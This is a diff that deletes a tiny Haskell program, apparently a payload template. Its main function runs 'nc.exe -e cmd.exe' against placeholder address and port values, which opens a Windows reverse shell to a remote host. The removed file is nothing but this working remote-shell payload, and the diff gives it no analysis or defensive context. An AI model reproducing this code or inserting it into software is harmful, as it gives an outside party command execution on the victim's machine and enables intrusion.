@@ -1,6 +1,0 @@
-module Main where
-
-import System.Process
-
-main :: IO ()
-main = callCommand "nc.exe -e cmd.exe __IPADDR__ __PORT__"
